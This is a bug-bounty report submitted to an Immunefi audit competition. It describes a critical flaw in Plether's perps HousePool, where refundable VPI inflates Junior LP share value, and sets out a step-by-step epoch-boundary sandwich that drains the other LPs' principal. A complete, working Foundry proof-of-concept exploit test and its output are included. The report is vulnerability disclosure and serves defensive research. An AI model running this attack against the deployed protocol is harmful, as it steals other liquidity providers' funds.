# \#97905 [SC-Critical] Refundable VPI inflates NAV, letting a Junior LP steal from other Junior LPs

**Submitted on Nov 3rd 2026 at 20:17:57 UTC by @Blobism for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97905
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a trader opens a position that increases market skew, the virtual price impact (VPI) it pays goes straight into
`HousePool` as LP revenue, so Junior share value rises at once. Yet the same VPI must be paid back to the trader when
the skew is unwound. LP share pricing has no liability for this refundable amount. As a result, one ordinary address
that is a large Junior LP and also trades can:

1. Open a max-skew position just before an hourly LP epoch boundary.
2. Redeem its Junior shares at the VPI-inflated price.
3. Close the position and get the full VPI back from the pool.

In production this lets the attacker repeatedly take principal from the remaining Junior LPs. Each cycle takes a few
basis points of pool depth, and it can be repeated every few hours with no privileged role, oracle manipulation or
price movement.

## Vulnerability Details

### VPI is a refundable potential, not final income

VPI prices the skew as a potential `C(S) = k·S²/(2D)`. A trade pays `C(S_post) − C(S_pre)`, so moving the skew from
`0` to `S` costs `C(S)`, and moving it back from `S` to `0` earns a rebate of `C(S)` (WHITEPAPER §5.1: "Reversing the
move at unchanged depth produces a … rebate"). Collected positive VPI is therefore money the pool owes back to
whoever unwinds the skew.

**1. The open charge is booked as LP-owned cash at once.**

`libraries/OpenAccountingLib.sol#L127-L135`:

```solidity
(valid, state.vpiAssets) = CfdMath.tryCalculateVPI(
    inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.riskParams.vpiFactor
);
...
state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets);
```

`CfdEngineSettlementSidecar.sol#L454-L464`:

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

**2. The close pays it back to the same trader.** The lifetime clamp only stops lifetime VPI from going *below zero*,
so a position that paid `C(S)` gets exactly `C(S)` back.

`libraries/CloseAccountingLib.sol#L102-L117`:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The rebate is paid out of HousePool cash
(`CfdEngineSettlementSidecar.sol#L621-L624`):

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

The code comment shows the clamp was designed against an LP sandwich that changes pool *depth*. It does not address
the sandwich below, which keeps depth essentially unchanged and only times LP pricing between the charge and the
refund.

**3. LP pricing ignores the refundable VPI.** The terminal-NAV snapshot shared by redemption and deposit pricing is
`physicalAssets − traderClaims + terminalPriceDelta`. Nothing subtracts the outstanding skew potential `C(S)`.

`libraries/HousePoolAccountingLib.sol#L60-L77`:

```solidity
function buildReconcileSnapshot(
    HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
) internal pure returns (ReconcileSnapshot memory snapshot) {
    uint256 terminalAssets = engineSnapshot.physicalAssets;
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
    ...
    if (terminalAssets >= terminalLiabilities) {
        snapshot.distributable = terminalAssets - terminalLiabilities;
    } else {
        snapshot.deficit = terminalLiabilities - terminalAssets;
    }
}
```

`HousePool._settleLpEpoch`
(`HousePool.sol#L824`)
reconciles with this snapshot and funds matured redemptions at the resulting tranche price.

So the VPI cash counts toward LP NAV only while the skew exists. LPs who exit during that time keep their share of it
for good, and the later refund comes out of the LPs who remain.

### Attack

All steps use permissionless public entry points and a single attacker address (Junior LP, trader and keeper):

1. `TrancheVault.requestRedeem(shares, attacker, attacker)` for the attacker's aged Junior shares (normal request,
   more than 5 minutes before the cutoff).
2. About 2 minutes before the epoch boundary: `OrderRouter.commitOrder(...)` a skew-increasing open up to the 40%
   skew cap, then `executeOrder` it itself. This pays `C(S)` of VPI into HousePool as LP revenue.
3. Right after the boundary: `OrderRouter.settleLpEpoch(pythData)`. The redemption is priced with `C(S)` in NAV, so
   the attacker receives `f·C(S)` extra, where `f` is its share of Junior NAV.
4. `commitOrder` and `executeOrder` the full close. The skew returns to its previous value and the pool rebates the
   full `C(S)`.
5. `MarginClearinghouse.withdraw`.

Net attacker profit is about `f·C(S) − openFee − closeFee`. With the release parameters
(`packages/perps/DEPLOYMENT.md`: `vpiFactor = 0.01e18`, `maxSkewRatio = 0.4e18`, `executionFeeBps = 4`), VPI at full
skew is about 20 bps of notional and the fees about 8 bps. The attack is therefore profitable for `f > ~0.4`, and for
lower `f` when same-direction skew already exists, since the marginal VPI per notional is `k(S0+S_post)/(2D)`.

Worked example (PoC `test_VpiSandwich_SmallPool`): Junior has 1.0M USDG from the victim and 1.5M USDG from the
attacker, so `f ≈ 0.6` and depth `D ≈ 2.502M`.

- A 1.0M-notional LONG pays VPI `0.01·(1M)²/(2·2.502M) ≈ 1,998 USDG` into the pool.
- The attacker's redemption captures `≈ 1,199 USDG` of it.
- The close rebates `1,998 USDG` (net of the 400 USDG close fee, which stays in the pool). The open fee of 400 USDG
  goes to the treasury.
- Compared with an honest redemption of the same shares: the attacker gains **+398.49 USDG** and the victim loses
  **−797.69 USDG**, ending below its deposit.

## Impact Details

**Impact: Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

The stolen value is the remaining Junior LPs' principal. Their share value falls below what they deposited. This is
not undistributed revenue.

Losses measured by the PoC (each compared with an honest redemption in the same state):

| Scenario | Attacker net gain | Other Junior LPs' loss |
| --- | --- | --- |
| 2.5M USDG Junior, attacker owns 60% | +398.49 USDG | −797.69 USDG |
| 25M USDG Junior, attacker owns 60% | +3,682.74 USDG | −7,601.98 USDG |
| 25M USDG Junior, attacker owns 35%, existing 25% skew | +1,233.73 USDG | −2,713.56 USDG |

- **Scaling:** losses grow linearly with pool depth. Per cycle, victims lose roughly twice the attacker's gain; the
  difference is the execution fees.
- **Repeatability:** after redeeming, the attacker can deposit again and repeat once the 1h cooldown has passed. That
  is roughly one cycle every few hours, with no limit on the number of cycles, so losses keep adding up.
- **Requirements:** a large Junior share (about 40%, or less when skew already exists), room under the skew cap,
  normal market hours, and enough free pool cash to fund the redemption. No privileged role, oracle manipulation,
  flash loan, Sybil identities or cooperation from other users is needed. The PoC scenarios need 1.5M to 15M USDG
  of LP capital. Under the program's feasibility rules, a high capital requirement is not a reason to downgrade
  unless the attack needs USD 100M or more.
- **Exposure:** the attacker holds the position for only about 2-3 minutes. That price risk can be hedged
  off-protocol.

## References

- VPI charge at open: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L127-L135
- Open VPI booked as LP revenue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464
- Close VPI and lifetime clamp: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L102-L117
- Close rebate paid from HousePool: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624
- LP NAV snapshot (no VPI liability): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L77
- LP epoch settlement / redemption pricing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824
- VPI design (potential, rebate, lifetime clamp), WHITEPAPER §5.1: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md
- Release parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md

## Proof of Concept

## Proof of Concept

The PoC runs in the repository's Foundry suite at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` and changes no
in-scope contract.

- It overrides `BasePerpTest`'s router deployment hook so that the production `OrderRouter` is deployed instead of
  the test-only harness.
- Only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocked.
- Risk parameters match `DEPLOYMENT.md`.
- Each test runs the same scenario twice from a state snapshot, once as an honest redemption and once with the
  sandwich. It asserts that the attacker profits and that the other LPs lose more than the attacker gains.

Save as `packages/perps/test/perps/VpiNavSandwichPoc.t.sol` and run:

```
forge test --root packages/perps --match-path test/perps/VpiNavSandwichPoc.t.sol -vv
```

Output:

```
[PASS] test_VpiSandwich_LargePool()
  victim junior / attacker junior / notional (USDG): 10000000 15000000 9800000
  attacker net gain vs honest redemption (USDG atoms): 3682739591
  victim junior LP loss vs honest redemption (USDG atoms): 7601979402
[PASS] test_VpiSandwich_MinorityWithExistingSkew()
  victim junior / attacker junior / notional (USDG): 16250000 8750000 3700000
  attacker net gain vs honest redemption (USDG atoms): 1233728113
  victim junior LP loss vs honest redemption (USDG atoms): 2713561129
[PASS] test_VpiSandwich_SmallPool()
  victim junior / attacker junior / notional (USDG): 1000000 1500000 1000000
  attacker net gain vs honest redemption (USDG atoms): 398490858
  victim junior LP loss vs honest redemption (USDG atoms): 797693175
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {LegacyOrderRouterHarness} from "../utils/LegacyOrderRouterHarness.sol";
import {console2} from "forge-std/console2.sol";

/// @title VPI / LP-epoch NAV sandwich PoC
/// @notice Positive VPI paid by a skew-increasing open is booked as HousePool cash (and therefore Junior NAV)
///         immediately, but the same trader is entitled to have it rebated when the skew is unwound. A Junior LP who
///         controls the trader account opens a max-skew position just before an LP epoch boundary, redeems its
///         Junior shares at the VPI-inflated price, then closes and receives the full VPI back from the pool.
///         The VPI portion paid out to the redeeming LP is taken from the remaining LPs.
///         Only public entrypoints of the PRODUCTION OrderRouter are used (commitOrder(OrderRequest) / executeOrder / updateMarkPrice / settleLpEpoch,
///         TrancheVault.requestRedeem / redeem, MarginClearinghouse.withdraw).
contract VpiNavSandwichPoc is BasePerpTest {

    address internal constant VICTIM_LP = address(0xBEEF);
    address internal constant ATTACKER = address(0xA77AC); // attacker: Junior LP, trader and keeper
    address internal constant ATTACKER_TRADER = ATTACKER; // same single address trades (no second identity needed)

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md (used by the program for severity).
    ///      executionFeeBps is the engine default of 4 (DEPLOYMENT.md).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Deploy the PRODUCTION OrderRouter (not the test-only harness subclass). The base test stores it in a
    ///      harness-typed variable, but this PoC only calls production OrderRouter functions on it.
    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter prod = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(prod), predictedRouter);
        deployedRouter = LegacyOrderRouterHarness(address(prod));
    }

    uint256 internal clientNonce;

    /// @dev Production V3 commit (OrderRouter.commitOrder(OrderRequest)) with permissive trader-chosen bounds.
    function _commit(
        address trader,
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderRouter prod = OrderRouter(payable(address(router)));
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(++clientNonce),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(prod.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(prod.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: prod.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        orderId = prod.commitOrder(request);
    }

    struct Result {
        int256 attackerPnl; // attacker's total USDG change (wallet + clearinghouse balance)
        uint256 victimValue; // victim's remaining Junior share value
    }

    /// @dev Signed live-basket payload: one tick per basket feed at the current block timestamp.
    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _attackerTotal() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER);
    }

    uint256 internal existingSkewSize; // optional pre-existing LONG skew held by an unrelated trader

    function _run(
        uint256 victimJunior,
        uint256 attackerJunior,
        uint256 sizeDelta,
        bool sandwich
    ) internal returns (Result memory r) {
        uint256 notionalAssets = sizeDelta / 1e12; // price 1.00 => 18-dec size to 6-dec USDG
        _fundJunior(VICTIM_LP, victimJunior);
        _fundJunior(ATTACKER, attackerJunior);
        if (existingSkewSize != 0) {
            address other = address(0x07E5);
            _fundTrader(other, existingSkewSize / 1e12 / 10);
            uint64 id = _commit(other, CfdTypes.Side.LONG, existingSkewSize, existingSkewSize / 1e12 / 20, 1e8, false);
            bytes[] memory px0 = _mockPythUpdateData(1e8);
            router.executeOrder(id, px0);
        }
        _fundTrader(ATTACKER_TRADER, notionalAssets / 10); // ample trading cash
        uint256 start = _attackerTotal();

        // Wait out the 1h deposit cooldown and keep the mark fresh.
        vm.warp(block.timestamp + 2 hours);
        router.updateMarkPrice(_livePriceData(1e8));

        // 1. Ordinary redemption request for the attacker's whole Junior balance.
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 epochStart = pool.lpEpochStart(requestId);

        if (sandwich) {
            // 2. Two minutes before the boundary: open a max-skew LONG, paying positive VPI into HousePool.
            vm.warp(epochStart - 120);
            uint64 openId = _commit(ATTACKER_TRADER, CfdTypes.Side.LONG, sizeDelta, notionalAssets / 20, 1e8, false);
            bytes[] memory px = _mockPythUpdateData(1e8);
            vm.prank(ATTACKER_TRADER);
            router.executeOrder(openId, px); // attacker self-executes, so the execution bounty returns to itself
            (uint256 size,,,,,,) = engine.positions(ATTACKER_TRADER);
            require(size == sizeDelta, "open did not execute");
        }

        // 3. Epoch boundary: anyone (here the attacker) runs the public atomic LP settlement route. The redemption is
        //    priced at a NAV that includes the VPI just paid.
        vm.warp(epochStart + 1);
        vm.roll(block.number + 1);
        vm.prank(ATTACKER);
        router.settleLpEpoch(_livePriceData(1e8));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        require(claimable == shares, "redemption not fully funded");
        vm.prank(ATTACKER);
        juniorVault.redeem(claimable, ATTACKER, ATTACKER);

        if (sandwich) {
            // 4. Close: skew returns to zero and the pool rebates the full VPI to the same trader.
            uint64 closeId = _commit(ATTACKER_TRADER, CfdTypes.Side.LONG, sizeDelta, 0, type(uint256).max, true);
            bytes[] memory px2 = _mockPythUpdateData(1e8);
            vm.prank(ATTACKER_TRADER);
            router.executeOrder(closeId, px2);
            (uint256 size,,,,,,) = engine.positions(ATTACKER_TRADER);
            require(size == 0, "close did not execute");
        }

        // 5. Withdraw all trading cash.
        uint256 bal = clearinghouse.balanceAssets(ATTACKER_TRADER);
        if (bal > 0) {
            vm.prank(ATTACKER_TRADER);
            clearinghouse.withdraw(ATTACKER_TRADER, bal);
        }

        r.attackerPnl = int256(_attackerTotal()) - int256(start);
        r.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP));
    }

    function _compare(
        uint256 victimJunior,
        uint256 attackerJunior,
        uint256 sizeDelta
    ) internal {
        uint256 snap = vm.snapshotState();
        Result memory base = _run(victimJunior, attackerJunior, sizeDelta, false);
        vm.revertToState(snap);
        Result memory atk = _run(victimJunior, attackerJunior, sizeDelta, true);

        int256 attackerGain = atk.attackerPnl - base.attackerPnl;
        int256 victimLoss = int256(base.victimValue) - int256(atk.victimValue);
        console2.log("victim junior / attacker junior / notional (USDG):");
        console2.log(victimJunior / 1e6, attackerJunior / 1e6, sizeDelta / 1e18);
        console2.log("attacker net gain vs honest redemption (USDG atoms):", attackerGain);
        console2.log("victim junior LP loss vs honest redemption (USDG atoms):", victimLoss);

        assertGt(attackerGain, 0, "attacker profits from the sandwich");
        assertGt(victimLoss, attackerGain, "other LPs fund the attacker's profit");
    }

    /// @notice ~2.5M USDG Junior pool, attacker owns 60%.
    function test_VpiSandwich_SmallPool() public {
        _compare(1_000_000e6, 1_500_000e6, 1_000_000e18);
    }

    /// @notice 10x larger pool: profit scales linearly with pool depth.
    function test_VpiSandwich_LargePool() public {
        _compare(10_000_000e6, 15_000_000e6, 9_800_000e18);
    }

    /// @notice Minority attacker (35% of Junior) when another trader already holds 25% same-side skew.
    function test_VpiSandwich_MinorityWithExistingSkew() public {
        existingSkewSize = 6_250_000e18; // 25% of ~25M depth
        _compare(16_250_000e6, 8_750_000e6, 3_700_000e18); // attacker adds ~15% skew (to just under the 40% cap)
    }

}
```
